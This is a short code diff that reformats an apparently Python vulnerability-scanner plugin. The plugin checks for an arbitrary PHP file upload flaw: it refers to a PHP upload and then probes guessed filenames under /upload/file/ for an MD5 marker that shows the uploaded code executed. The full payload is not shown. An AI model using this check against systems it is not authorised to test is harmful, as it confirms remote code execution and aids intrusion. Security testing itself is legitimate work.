@@ -40,9 +40,10 @@ class Poc(ABPoc):
                 }
             }
         }
-                    
+
     def verify(self):
-        self.target = self.target.rstrip('/') + '/' + (self.get_option('base_path').lstrip('/'))
+        self.target = self.target.rstrip(
+            '/') + '/' + (self.get_option('base_path').lstrip('/'))
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
@@ -89,7 +90,7 @@ Content-Type: application/x-php
             for i in range(100, 10000):
                 filename = name + i
                 url = self.target + '/upload/file/%s.php' % (str(filename))
-                #print url
+                # print url
                 code, head, res, errcode, finalurl = hh.http(url)
 
                 if code == 200 and "c4ca4238a0b923820dcc509a6f75849b" in res:
